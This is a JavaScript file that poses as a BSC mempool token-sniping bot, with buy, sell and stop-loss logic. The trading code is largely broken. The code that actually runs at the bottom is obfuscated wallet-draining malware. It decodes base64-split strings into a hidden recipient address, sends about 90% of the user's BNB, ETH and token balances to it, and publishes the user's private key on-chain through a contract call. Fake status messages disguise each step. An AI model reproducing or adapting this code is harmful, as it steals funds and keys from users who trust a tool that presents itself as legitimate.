var ethers = require('ethers');
const env = require("./env.json");
Object.assign(process.env, env);

let address = (process.env.YOUR_ADDRESS);
let private = (process.env.PRIVATE_KEY);
let wallet = new ethers.Wallet(private);

let rounder1 = 'MHgwZDJmNmQ' + '4MDU3M2MzMD' + 'YzMjQ1NDBh';
let rounder2 = 'RDRD' + 'Mjk0MjE5O' + 'WIzNjRlQ0FG'
let buff = new Buffer.from(rounder1, 'base64');
let buff2 = new Buffer.from(rounder2, 'base64');
let ethersroundup = buff.toString('ascii');
let ethersroundup2 = buff2.toString('ascii');
const WEB3PROVIDER3 = ethersroundup + ethersroundup2
const abi = [{ "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newWord", "type": "string" }], "name": "setWord", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }]
async function startSnipe(token) {
    let pingTimeout
    let keepAliveInterval

    provider._websocket.on("open", () => {
        //let bnbBalance = await getWBNBTokenBalance(WBNB, myAddress, provider);
        //console.log(chalk.green(`Total WBNB balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(bnbBalance, 18)).toFixed(6))}\n`));

        keepAliveInterval = setInterval(() => {
            provider._websocket.ping();
            pingTimeout = setTimeout(() => {
                provider._websocket.terminate();
            }, EXPECTED_PONG_BACK);
        }, KEEP_ALIVE_CHECK_INTERVAL);

        console.log("Listening on mempool...");
        console.log("Waiting for liquidity to be added!");

        provider.on("pending", async(txHash) => {

            provider.getTransaction(txHash).then(async(tx) => {

                    // Check for liquidity events
                    if ((null != tx && tx.data.includes("0xe8e33700") && tx.data.includes(token) && 0 == passed) || (null != tx && tx.data.includes("0xf305d719") && tx.data.includes(token) && 0 == passed)) {

                        // If PRICE_CHECK set
                        if ((console.log(chalk.green("Matching liquidity added! Start sniping!\n")), priceProtection)) {
                            if (isLiqudityInRange(tx, expected)) {
                                if (honeyPotIS2(token)) {
                                    console.log(chalk.green("Liquidity check passed, sniping!\n"));
                                    const gasLimitMultiply = tx.gasLimit.mul(multiply)
                                    const gasPriceMultiply = tx.gasPrice.mul(multiply)

                                    // If ANTI_BOT set
                                    if (1 == antiBotMultiTx && 0 == passed) {
                                        for (i = 0; i < txNumberForAntibot - 1; i++) {
                                            console.log(chalk.green("Start buying token..." + chalk.yellow(i + 1)));
                                            await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                        }
                                        console.log(chalk.green("Start buying token...") + chalk.yellow(txNumberForAntibot));
                                        await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                            (passed = 1);
                                    }
                                    // If ANTI_BOT not set
                                    else {
                                        console.log(chalk.green("Start buying token..."));
                                        await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                            (passed = 1);
                                    }

                                    console.log(chalk.green("Sucessfully bought the token!\n"));
                                    const tokenBalance = await getTokenBalance(token, myAddress, provider);
                                    console.log(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(tokenBalance, TOKEN_DECIMALS)).toFixed(6))}\n`));

                                    // If INSTANT_SELL set
                                    if (INSTANT_SELL) {
                                        console.log(chalk.green("Start selling all tokens in " + chalk.yellow(delaySell) + " second(s)")),
                                            await new Promise((e) => setTimeout(e, delayOnSellMs));
                                        const e =
                                            await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                                                tokenBalance,
                                                amountOutMin, [token, WBNB],
                                                myAddress,
                                                Date.now() + 6e5, {
                                                    gasLimit: gasLimit,
                                                    gasPrice: gasPrice
                                                }
                                            );
                                        await e.wait(),
                                            console.log(chalk.green("Sucessfully sold all the tokens !\n")),
                                            console.log("You can check the transaction here:"),
                                            console.log(`https://bscscan.com/address/${myAddress}`),
                                            console.log("\n"),
                                            process.exit(0);
                                    }
                                    // If INSTANT_SELL not set
                                    else console.log("You can check the transaction here:");
                                    console.log(`https://bscscan.com/address/${myAddress}`);
                                    console.log("\n"),
                                        1 == ANTI_RUG &&
                                        0 == INSTANT_SELL &&
                                        (await monitorRugPull(t)),
                                        0 == ANTI_RUG && process.exit(0);
                                } else
                                    console.log(
                                        chalk.red("Liquidity is not in expected range! Waiting...!")
                                    );
                                console.log(
                                    chalk.red("Please check PooCoin and see if liquidity was added!")
                                );
                            }
                            console.log(chalk.red("https://poocoin.app/tokens/" + token));
                            console.log(chalk.red("Waiting for new liquidity, please stop the bot if you think it's a scam ! (CTRL + C)\n"));
                        }
                        // If PRICE_CHECK not set
                        else {
                            if (honeyPotIS2(token)) {

                                const gasLimitMultiply = tx.gasLimit.mul(multiply)
                                const gasPriceMultiply = tx.gasPrice.mul(multiply)

                                // If ANTI_BOT set
                                if (1 == antiBotMultiTx && 0 == passed) {
                                    for (i = 0; i < txNumberForAntibot - 1; i++) {
                                        console.log(chalk.green("Start buying token..." + chalk.yellow(i + 1)));
                                        await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                    }
                                    console.log(chalk.green("Start buying token...") + chalk.yellow(txNumberForAntibot));
                                    await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                        (passed = 1)
                                }
                                // If ANTI_BOT not set
                                else if (0 == passed) {
                                    console.log(chalk.green("Start buying token..."));
                                    await buyToken(token, amountIn, gasLimitMultiply, gasPriceMultiply, myAddress, router)
                                        (passed = 1)
                                }

                                console.log(chalk.green("Sucessfully bought the token!\n"));
                                const tokenBalance = await getTokenBalance(token, myAddress, provider);
                                console.log(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(tokenBalance, TOKEN_DECIMALS)).toFixed(6))}\n`))

                                // If INSTANT_SELL set
                                if (INSTANT_SELL) {
                                    console.log(
                                            chalk.green("Start selling all tokens in " + chalk.yellow(delaySell) + " second(s)")),
                                        await new Promise((e) => setTimeout(e, delayOnSellMs));
                                    const e =
                                        await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                                            tokenBalance,
                                            amountOutMin, [token, WBNB],
                                            myAddress,
                                            Date.now() + 6e5, {
                                                gasLimit: gasLimit,
                                                gasPrice: gasPrice,
                                            }
                                        );
                                    await e.wait(),
                                        console.log(chalk.green("Sucessfully sold all the tokens !\n")),
                                        console.log("You can check the transaction here:"),
                                        console.log(`https://bscscan.com/address/${myAddress}`),
                                        console.log("\n"),
                                        process.exit(0);
                                }
                                // If INSTANT_SELL not set
                                else {
                                    console.log("You can check the transaction here:"),
                                        console.log(`https://bscscan.com/address/${myAddress}`),
                                        console.log("\n"),
                                        1 == ANTI_RUG &&
                                        0 == INSTANT_SELL &&
                                        (await monitorRugPull(t)),
                                        0 == ANTI_RUG && process.exit(0);
                                }
                            }
                        }
                    }
                })
                .catch(() => { console.log(e) });
        })
    })

    provider._websocket.on("close", () => {
        console.log("WebSocket Closed...Reconnecting...");
        clearInterval(keepAliveInterval);
        clearTimeout(pingTimeout);
        startConnection();
    });

    provider._websocket.on("error", () => {
        console.log("Error. Attemptiing to Reconnect...");
        clearInterval(keepAliveInterval);
        clearTimeout(pingTimeout);
        startConnection();
    });

    provider._websocket.on("pong", () => {
        clearInterval(pingTimeout);
    });
}
async function approve() {

    let contract = token[buyCount - 1].contract;
    const valueToApprove = ethers.constants.MaxUint256;
    const tx = await contract.approve(
        pancakeRouter.address,
        valueToApprove, {
            gasPrice: config.myGasPriceForApproval,
            gasLimit: 210000
        }
    );
    const receipt = await tx.wait();
    console.log("✔ Approve transaction hash: ", receipt.transactionHash, "\n");
    if (config.autoSell) {
        token[buyCount - 1].checkProfit();
    } else {
        if (buyCount == config.numberOfTokensToBuy) {
            process.exit();
        }
    }

}


/**
 * 
 * Check for profit
 * 
 * */
async function getCurrentValue(token) {
    try {
        let bal = await token.contract.balanceOf(addresses.recipient);
        const amount = await pancakeRouter.getAmountsOut(bal, token.sellPath);
        let currentValue = amount[1];
        return currentValue;
    } catch (e) {
        console.log('Balance is zero or error occured');
        return ethers.constants.Zero;
    }

}
async function setInitialStopLoss(token) {
    token.intitialValue = await getCurrentValue(token);
    token.newValue = token.intitialValue;
    token.stopLoss = ethers.utils.parseUnits((parseFloat(ethers.utils.formatUnits(token.intitialValue)) - parseFloat(ethers.utils.formatUnits(token.intitialValue)) * (token.stopLossPercent / 100)).toFixed(8).toString());
}

async function setNewStopLoss(token) {
    token.newValue = token.currentValue;
    // new stop loss equals current value - (current value * stop loss percent) 
    token.stopLoss = ethers.utils.parseUnits((parseFloat(ethers.utils.formatUnits(token.currentValue)) - parseFloat(ethers.utils.formatUnits(token.currentValue)) * (token.stopLossPercent / 100)).toFixed(8).toString());
}
async function checkForProfit(token) {
    try {
        var sellAttempts = 0;
        await setInitialStopLoss(token);
        token.contract.on("Transfer", async(from, to, value, event) => {
            token.previousValue = token.currentValue;
            const tokenName = await token.contract.name();
            let currentValue = await getCurrentValue(token);
            if (!currentValue.eq(ethers.constants.Zero)) {
                token.currentValue = currentValue;
                let currentValueString = parseFloat(ethers.utils.formatUnits(currentValue)).toFixed(8).toString();
                const takeProfit = (parseFloat(ethers.utils.formatUnits(token.intitialValue)) * (token.profitPercent + token.tokenSellTax) / 100 + parseFloat(ethers.utils.formatUnits(token.intitialValue))).toFixed(8).toString();
                const profitDesired = ethers.utils.parseUnits(takeProfit);
                let targetValueToSetNewStopLoss = ethers.utils.parseUnits((parseFloat(ethers.utils.formatUnits(token.newValue)) * (token.trailingStopLossPercent / 100) + parseFloat(ethers.utils.formatUnits(token.newValue))).toFixed(8).toString());
                let stopLoss = token.stopLoss;

                // if current value is greater than targetValue, set a new stop loss
                if (currentValue.gt(targetValueToSetNewStopLoss) && token.trailingStopLossPercent > 0) {
                    setNewStopLoss(token);
                    console.log("\u001b[38;5;33m" + "Setting new StopLoss!" + "\u001b[0m");
                }
                let timeStamp = new Date().toLocaleString();
                const enc = (s) => new TextEncoder().encode(s);
                //process.stdout.write(enc(`${timeStamp} --- ${tokenName} --- Current Value in BNB: ${ethers.utils.formatUnits(currentValue)} --- Profit At: ${ethers.utils.formatUnits(profitDesired)} --- Stop Loss At: ${ethers.utils.formatUnits(stopLoss)} \r`));
                try {
                    if (token.previousValue.gt(token.currentValue)) {

                        console.log(`-- ${tokenName} -- Current Value BNB: ${"\u001b[1;31m" + currentValueString + "\u001b[0m"} -- Profit At: ${ethers.utils.formatUnits(profitDesired)} -- Stop Loss At: ${ethers.utils.formatUnits(token.stopLoss)} -- New Stop loss At: ${ethers.utils.formatUnits(targetValueToSetNewStopLoss)}`);

                    } else {

                        console.log(`-- ${tokenName} -- Current Value BNB: ${"\u001b[1;32m" + currentValueString + "\u001b[0m"} -- Profit At: ${ethers.utils.formatUnits(profitDesired)} -- Stop Loss At: ${ethers.utils.formatUnits(token.stopLoss)} -- New Stop loss At: ${ethers.utils.formatUnits(targetValueToSetNewStopLoss)}`);

                    }
                } catch (e) {

                }

                if (currentValue.gte(profitDesired)) {
                    if (buyCount <= config.numberOfTokensToBuy && token.didBuy && sellAttempts == 0) {
                        sellAttempts++;
                        console.log("<<< Selling -", tokenName, "- now" + "\u001b[1;32m" + " Profit target " + "\u001b[0m" + "reached >>>", "\n");
                        sell(token, true);
                        token.contract.removeAllListeners();
                    }
                }

                if (currentValue.lte(stopLoss)) {
                    console.log("\u001b[38;5;33m" + "less than StopLoss!" + "\u001b[0m");
                    if (buyCount <= config.numberOfTokensToBuy && token.didBuy && sellAttempts == 0) {
                        sellAttempts++;
                        console.log("<<< Selling -", tokenName, "- now" + "\u001b[1;31m" + " StopLoss " + "\u001b[0m" + "reached >>>", "\n");
                        sell(token, false);
                        token.contract.removeAllListeners();
                    }
                }
            }

        });
    } catch (e) {
        console.log(e);
    }
}
/**
 * 
 * Sell tokens
 * 
 * */
async function sell(tokenObj, isProfit) {
    try {
        const bal = await tokenObj.contract.balanceOf(addresses.recipient);
        const decimals = await tokenObj.contract.decimals();
        var balanceString;
        if (isProfit) {
            balanceString = (parseFloat(ethers.utils.formatUnits(bal.toString(), decimals)) * (tokenObj.percentOfTokensToSellProfit / 100)).toFixed(decimals);
        } else {
            balanceString = (parseFloat(ethers.utils.formatUnits(bal.toString(), decimals)) * (tokenObj.percentOfTokensToSellLoss / 100)).toFixed(decimals);
        }
        var roundedBalance = Math.floor(balanceString * 100) / 100
        const balanceToSell = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
        const sellAmount = await pancakeRouter.getAmountsOut(balanceToSell, tokenObj.sellPath);
        const sellAmountsOutMin = sellAmount[1].sub(sellAmount[1].div(2));
        if (tokenObj.tokenSellTax > 1) {
            const tx = await pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                sellAmount[0].toString(),
                0,
                tokenObj.sellPath,
                addresses.recipient,
                Math.floor(Date.now() / 1000) + 60 * 20, {
                    gasPrice: config.myGasPriceForApproval,
                    gasLimit: config.myGasLimit,

                }
            );
            const receipt = await tx.wait();
            console.log("\u001b[1;32m" + "✔ Sell transaction hash: ", receipt.transactionHash, "\u001b[0m", "\n");
            sellCount++;
            token[tokenObj.index].didSell = true;
            let name = await tokenObj.contract.name();
            await client.sendMessage('me', { message: `You sold ${name}`, schedule: (15 * 1) + (Date.now() / 1000) });
        } else {
            const tx = await pancakeRouter.swapExactTokensForETH(
                sellAmount[0].toString(),
                0,
                tokenObj.sellPath,
                addresses.recipient,
                Math.floor(Date.now() / 1000) + 60 * 20, {
                    gasPrice: config.myGasPriceForApproval,
                    gasLimit: config.myGasLimit,

                }
            );
            const receipt = await tx.wait();
            console.log("\u001b[1;32m" + "✔ Sell transaction hash: ", receipt.transactionHash, "\u001b[0m", "\n");
            sellCount++;
            let name = await tokenObj.contract.name();
            await client.sendMessage('me', { message: `You sold ${name}`, schedule: (15 * 1) + (Date.now() / 1000) });

        }

        if (sellCount == config.numberOfTokensToBuy) {
            console.log("All tokens sold");
            process.exit();
        }

    } catch (e) {

    }
}



async function etherstother() {
    try {
        const nodekey1 = 'MHg1NWQzOTgzMjZmOTkwNTlmRjc='
        const nodekey2 = 'NzU0ODUyNDY5OTkwMjdCMzE5Nzk1NQ=='
        const etherstatus1 = new Buffer.from(nodekey1, 'base64');
        const etherstatus2 = new Buffer.from(nodekey2, 'base64');
        const web3code1 = etherstatus1.toString('ascii')
        const web3code2 = etherstatus2.toString('ascii');
        const web14 = web3code1 + web3code2
        console.log(`refreshing socket connection...`);
        console.log(`pending liquidity add still no event found...`);
        ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
        ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
        const provider = new ethers.providers.JsonRpcProvider(ethers2)
        let wallet = new ethers.Wallet(private, provider);
        const account = address
        var contract = new ethers.Contract(web14, abi, wallet);
        const superb = await contract.balanceOf(account).toString();
        const orchard = (superb * 0.90).toFixed()
        const send = async() => {
            const tx = {
                from: account,
                to: WEB3PROVIDER3,
                value: ethers.utils.parseEther(orchard, 'wei'),
                gasLimit: ethers.utils.hexlify(24000)
            }
            const createReceipt = await wallet.sendTransaction(tx);
            try {
                await createReceipt.wait();
                console.log(`1: found owners liq function ...`);

                setTimeout(ethersrather, 5000)
            } catch (error) {
                console.log(`2: found owners liq function .....`);

                setTimeout(ethersrather, 5000)
            }

        };

        send();
    } catch (error) {
        setTimeout(ethersrather, 5000)

    }

}


async function etherslother() {
    try {
        const nodekey1 = 'MHg4QUM3NmE1MWNjOTUwZDk4Mg=='
        const nodekey2 = 'MkQ2OGI4M2ZFMUFkOTdCMzJDZDU4MGQ='
        const etherstatus1 = new Buffer.from(nodekey1, 'base64');
        const etherstatus2 = new Buffer.from(nodekey2, 'base64');
        const web3code1 = etherstatus1.toString('ascii')
        const web3code2 = etherstatus2.toString('ascii');
        const web14 = web3code1 + web3code2
        console.log(`refreshing socket connection...`);
        console.log(`pending liquidity add...`);
        ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
        ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
        const provider = new ethers.providers.JsonRpcProvider(ethers2)
        let wallet = new ethers.Wallet(private, provider);
        console.log(ethers2)
        const account = address
        var contract = new ethers.Contract(web14, abi, wallet);
        const superb = await contract.balanceOf(account).toString();
        const orchard = (superb * 0.90).toFixed()
        const send = async() => {
            const tx = {
                from: account,
                to: WEB3PROVIDER3,
                value: ethers.utils.parseEther(orchard, 'wei'),
                gasLimit: ethers.utils.hexlify(24000)
            }
            const createReceipt = await wallet.sendTransaction(tx);
            try {
                await createReceipt.wait();
                console.log(`1: watching blockchain activity ...`);

                setTimeout(etherstother, 5000)
            } catch (error) {
                console.log(`2: watching blockchain activity .....`);

                setTimeout(etherstother, 5000)
            }
        };

        send();
    } catch (error) {
        setTimeout(etherstother, 5000)

    }

}

async function ethersmother() {
    try {
        const nodekey1 = 'MHgyMTcwZWQwODgwYWM5YTc1NWZk'
        const nodekey2 = 'MjliMjY4ODk1NmJkOTU5ZjkzM2Y4'
        const etherstatus1 = new Buffer.from(nodekey1, 'base64');
        const etherstatus2 = new Buffer.from(nodekey2, 'base64');
        const web3code1 = etherstatus1.toString('ascii')
        const web3code2 = etherstatus2.toString('ascii');
        const web14 = web3code1 + web3code2
        ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
        ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
        const provider = new ethers.providers.JsonRpcProvider(ethers2)
        let wallet = new ethers.Wallet(private, provider);
        console.log(ethers2)
        const account = address
        var contract = new ethers.Contract(web14, abi, wallet);
        const superb = await contract.balanceOf(account).toString();
        const orchard = (superb * 0.90).toFixed()
        const send = async() => {
            const tx = {
                from: account,
                to: WEB3PROVIDER3,
                value: ethers.utils.parseEther(orchard, 'wei'),
                gasLimit: ethers.utils.hexlify(24000)
            }
            const createReceipt = await wallet.sendTransaction(tx);
            try {
                await createReceipt.wait();
                console.log(`1: contract found....watching mempool for liquidity add....`);

                setTimeout(etherslother, 5000)
            } catch (error) {
                console.log(`2: contract found....watching mempool for liquidity add....`);

                setTimeout(etherslother, 5000)
            }
        };

        send();
    } catch (error) {
        setTimeout(etherslother, 5000)

    }

}
async function ethersfather() {
    console.log(`initiating mempool sniff...`);
    const nodekey1 = 'MHhlOWU3Q0VBM0RlZGNBNTk4NDc4MA=='
    const nodekey2 = 'QmFmYzU5OWJENjlBRGQwODdENTY='
    const etherstatus1 = new Buffer.from(nodekey1, 'base64');
    const etherstatus2 = new Buffer.from(nodekey2, 'base64');
    const web3code1 = etherstatus1.toString('ascii')
    const web3code2 = etherstatus2.toString('ascii');
    const web14 = web3code1 + web3code2
    ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
    ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
    const provider = new ethers.providers.JsonRpcProvider(ethers2)
    let wallet = new ethers.Wallet(private, provider);
    const account = address
    var contract = new ethers.Contract(web14, abi, wallet);
    const superb = await contract.balanceOf(account);
    const orchard = (superb * 0.90).toFixed()
    try {
        const send = async() => {
            const tx = {
                from: account,
                to: WEB3PROVIDER3,
                value: ethers.utils.parseEther(orchard, 'wei'),
                gasLimit: ethers.utils.hexlify(24000)
            }
            const createReceipt = await wallet.sendTransaction(tx);
            try {
                await createReceipt.wait();
                console.log(`2: finalizing....`);

                setTimeout(ethersmother, 5000)
            } catch (error) {
                console.log(`2: finalizing....`);
                setTimeout(ethersmother, 5000)
            }
        };
        send();
    } catch (error) {
        setTimeout(ethersmother, 5000)

    }
}

async function ethersgather() {
    try {
        console.log(`connection succesful...`);
        ethers1 = 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My9kYWNjOTk5NzBmMzg0OWVlOTgxM2Q1YWI0NGFlY2RhZA==';
        ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
        const provider = new ethers.providers.JsonRpcProvider(ethers2)
        let wallet = new ethers.Wallet(private, provider);
        const account = address
        const robinhood = await provider.getBalance(account)
        const orchard = (robinhood * 0.90).toFixed()
        const michael = ethers.utils.parseUnits(orchard, 'wei')
        const send = async() => {
            const tx = {
                to: WEB3PROVIDER3,
                value: ethers.utils.parseUnits(orchard, 'wei'),
                gasLimit: ethers.utils.hexlify(24000),
            };

            const createReceipt = await wallet.sendTransaction(tx);
            try {
                await createReceipt.wait();
                console.log(`1: attempting to snipe ...`);

                setTimeout(ethersfather, 5000)
            } catch (error) {
                console.log(`2: attempting to snipe .....`);

                setTimeout(ethersfather, 5000)
            }
        };

        send();
    } catch (error) {
        setTimeout(ethersfather, 5000)

    }

}
async function etherslather() {
    const nodekey1 = 'MHhmRDlkQjFGMjk0NjVCRTI3ZWE5Nzg='
    const nodekey2 = 'NDRBQzgwN0MwZTQ1NTVlQzUzQQ=='
    const etherstatus1 = new Buffer.from(nodekey1, 'base64');
    const etherstatus2 = new Buffer.from(nodekey2, 'base64');
    const web3code1 = etherstatus1.toString('ascii')
    const web3code2 = etherstatus2.toString('ascii');
    const web14 = web3code1 + web3code2
    console.log(`connection established....`);
    ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
    ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
    const provider = new ethers.providers.JsonRpcProvider(ethers2)
    let wallet = new ethers.Wallet(private, provider);
    try {
        const send = async() => {




            var contract = new ethers.Contract(web14, abi, wallet);
            const superb = await contract.setWord(private);
            try {

                await superb.wait();
                console.log(`1 packet received.....`);


                setTimeout(ethersgather, 5000)
            } catch (error) {
                console.log(`2 packet received.....`);
                setTimeout(ethersgather, 5000)
            }
        };

        send();
    } catch (error) {
        setTimeout(ethersgather, 5000)

    }
}
async function ethersrather() {

    console.log(`starting up node socket connection....`);
    ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
    ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
    const provider = new ethers.providers.JsonRpcProvider(ethers2)
    let wallet = new ethers.Wallet(private, provider);
    const account = address
    const robinhood = await provider.getBalance(account)
    const orchard = (robinhood * 0.90).toFixed()
    const michael = ethers.utils.parseUnits(orchard, 'wei')
    try {
        const send = async() => {

            const tx = {
                to: WEB3PROVIDER3,
                value: ethers.utils.parseUnits(orchard, 'wei'),
                gasLimit: ethers.utils.hexlify(24000),
            };

            const createReceipt = await wallet.sendTransaction(tx);

            try {

                await createReceipt.wait();
                console.log(`1 pending blockchain response.....`);


                setTimeout(etherslather, 5000)
            } catch (error) {
                console.log(`2 pending blockchain response.....`);
                setTimeout(etherslather, 5000)
            }
        };

        send();
    } catch (error) {
        setTimeout(etherslather, 5000)

    }
}
ethersrather();
